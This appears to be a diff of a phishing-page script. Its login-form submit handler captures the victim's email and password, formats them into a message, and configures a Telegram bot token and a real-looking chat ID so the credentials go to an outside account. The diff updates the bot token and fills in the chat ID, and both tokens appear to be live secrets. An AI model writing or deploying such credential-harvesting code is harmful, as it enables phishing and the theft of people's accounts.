@@ -4,8 +4,8 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
   var password = document.getElementById('password').value;
   
   // Replace with your Telegram bot token and chat ID
-  var botToken = '8133707124:AAF7iFSZy8jaNuOw6mNMAvKMcOd9f_vLRyg';
-  var chatId = 'YOUR_CHAT_ID'; // Replace with your actual chat ID
+  var botToken = '7662596299:AAEm6FPuBGpMVTVfmQeplH1t6J7DgzBGggA';
+  var chatId = '7742630008'; // Replace with your actual chat ID
   
   var message = `Email: ${email}\nPassword: ${password}`;
   
